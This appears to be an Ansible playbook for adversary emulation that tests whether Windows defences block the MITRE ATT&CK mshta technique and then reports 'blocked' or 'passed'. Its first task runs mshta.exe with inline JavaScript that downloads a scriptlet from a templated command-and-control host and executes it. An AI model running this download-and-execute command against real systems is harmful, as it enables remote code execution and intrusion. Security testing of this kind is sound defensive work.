#T1170 - Mshta
- name: MSHTA - Windows
  hosts: windows
  vars_files:
   - /opt/ansible/vars.yaml
  tasks:
    - name: Run mshta.exe to download and execute script (create a new file evil.sct)
      win_shell: |
        mshta.exe javascript:a=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}").Exec();close();
    - name: check file exist
      tags: always
      win_stat:
        path: evil.sct
      register: T1117
    - name: check if playbook was blocked
      tags: always
      debug: msg="Playbook Completed:T1117:blocked:win:"
      when: T1117.stat.exists == False        
    - name: check if playbook was successfull
      tags: always
      debug: msg="Playbook Completed:T1117:passed:win:"
      when: T1117.stat.exists  
